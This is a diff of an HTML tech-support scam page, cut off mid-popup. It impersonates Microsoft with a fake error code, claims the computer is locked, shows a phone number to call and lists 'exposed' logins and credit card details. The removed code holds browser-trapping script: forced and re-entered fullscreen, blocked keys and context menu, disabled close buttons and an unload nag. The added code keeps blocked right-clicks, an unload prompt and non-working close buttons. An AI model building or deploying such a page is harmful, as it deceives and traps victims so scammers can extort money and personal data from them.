@@ -2,218 +2,35 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-    <title>Warning Interface</title>
-    <style>
-        /* Global Styles */
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100vw;
-            height: 100vh;
-            overflow: hidden;
-            font-family: Arial, sans-serif;
-            user-select: none;
-        }
-
-        /* Visual Layout */
-        .container {
-            position: relative;
-            width: 100%;
-            height: 100%;
-            display: flex;
-        }
-
-        .left-section {
-            width: 50%;
-            height: 100%;
-            background-color: #C41E3A;
-            position: relative;
-        }
-
-        .right-section {
-            width: 50%;
-            height: 100%;
-            background-color: #0078D4;
-            position: relative;
-        }
-
-        .divider {
-            position: absolute;
-            top: 0;
-            left: 50%;
-            width: 1px;
-            height: 100%;
-            background-color: #fff;
-            z-index: 1;
-        }
-
-        /* Content */
-        .microsoft-logo {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            width: 50px;
-            height: 50px;
-            background-color: #fff;
-            /* Add logo image here */
-        }
-
-        .error-code {
-            position: absolute;
-            top: 100px;
-            left: 50%;
-            transform: translateX(-50%);
-            color: #C41E3A;
-            font-weight: bold;
-            font-size: 36px;
-        }
-
-        .phone-number {
-            position: absolute;
-            top: 200px;
-            left: 50%;
-            transform: translateX(-50%);
-            color: #fff;
-            font-size: 24px;
-        }
-
-        .list-items {
-            position: absolute;
-            top: 300px;
-            left: 50%;
-            transform: translateX(-50%);
-            color: #fff;
-            font-size: 24px;
-        }
-
-        .list-item {
-            margin-bottom: 20px;
-        }
-
-        /* Popups */
-        .popup {
-            position: absolute;
-            background-color: #fff;
-            border: 1px solid #ccc;
-            padding: 20px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
-            z-index: 10;
-        }
-
-        .popup .close {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            cursor: pointer;
-        }
-
-        .popup .warning-icon {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            color: #DC143C;
-        }
-
-        .back-to-safety {
-            position: absolute;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: #0078D4;
-            color: #fff;
-            border: none;
-            padding: 10px 20px;
-            cursor: pointer;
-        }
-
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Warning - MS Error</title>
+    <link rel="stylesheet" href="style.css">
 </head>
-<body>
-    <div class="container">
-        <div class="left-section">
-            <div class="microsoft-logo"></div>
-            <div class="error-code">ERROR # MS-0x8024402C</div>
-        </div>
-        <div class="right-section">
-            <div class="phone-number">+1 (877) 573 9043</div>
-            <div class="list-items">
-                <div class="list-item">1. Face book Logins</div>
-                <div class="list-item">2. Credit Card Details</div>
-                <div class="list-item">3. Email Account Logins</div>
-            </div>
-        </div>
-        <div class="divider"></div>
-        <!-- Popups -->
-        <div class="popup" style="top: 100px; left: 100px; z-index: 10;">
-            <span class="close">X</span>
-            <span class="warning-icon">&#9888;</span>
-            Warning message 1
-        </div>
-        <div class="popup" style="top: 200px; left: 300px; z-index: 20;">
-            <span class="close">X</span>
-            <span class="warning-icon">&#9888;</span>
-            Warning message 2
-        </div>
-        <div class="popup" style="top: 300px; left: 500px; z-index: 30;">
-            <span class="close">X</span>
-            <span class="warning-icon">&#9888;</span>
-            Warning message 3
-        </div>
-        <button class="back-to-safety">Back to safety</button>
+<body oncontextmenu="return false" onbeforeunload="return 'You will lose data!'">
+
+    <!-- Background Split -->
+    <div class="bg-left"></div>
+    <div class="bg-right"></div>
+
+    <!-- Main Content -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="logo" alt="Microsoft">
+    
+    <div class="error-code">ERROR # MS-0x8024402C</div>
+    
+    <div class="main-text">
+        <p>Your Computer has been locked. Please call Microsoft Support immediately</p>
+        <h1 class="phone-number">+1 (877) 573 9043</h1>
     </div>
 
-    <script>
-        // Full screen API
-        function goFullscreen() {
-            document.documentElement.requestFullscreen();
-        }
+    <div class="list-container">
+        <p>1. Face book Logins</p>
+        <p>2. Credit Card Details</p>
+        <p>3. Email Account Logins</p>
+    </div>
 
-        // Event listeners
-        document.addEventListener('mousemove', goFullscreen);
-        document.addEventListener('click', goFullscreen);
-        document.addEventListener('keydown', function(event) {
-            if (event.key === 'F11' || event.key === 'F12' || event.key === 'Alt+F4' || event.key === 'Ctrl+W' || event.key === 'Ctrl+F4' || event.key === 'Ctrl+Shift+W') {
-                event.preventDefault();
-            }
-        });
-        document.addEventListener('contextmenu', function(event) {
-            event.preventDefault();
-        });
-        document.addEventListener('dragstart', function(event) {
-            event.preventDefault();
-        });
-
-        // Block escape attempts
-        document.addEventListener('fullscreenchange', function() {
-            if (!document.fullscreenElement) {
-                goFullscreen();
-            }
-        });
-
-        // Continuous full screen check
-        setInterval(goFullscreen, 1000);
-
-        // Prevent closing with onbeforeunload event
-        window.onbeforeunload = function() {
-            return "You will lose data";
-        };
-
-        // Disable popup close buttons
-        const closeButtons = document.querySelectorAll('.close');
-        closeButtons.forEach(button => {
-            button.addEventListener('click', function(event) {
-                event.preventDefault();
-                return false;
-            });
-        });
-
-        // Try-catch block to prevent console access
-        try {
-            console.log('Access denied');
-        } catch (e) {
-            // do nothing
-        }
-    </script>
-</body>
-</html>
+    <!-- Popup Windows -->
+    <div class="popup" style="z-index: 10; top: 10%; left: 5%;">
+        <div class="close-btn" onclick="return false;">X</div>
+        <div class="popup-content">
+            <span class="warning-icon">⚠️</span>
+            <p>
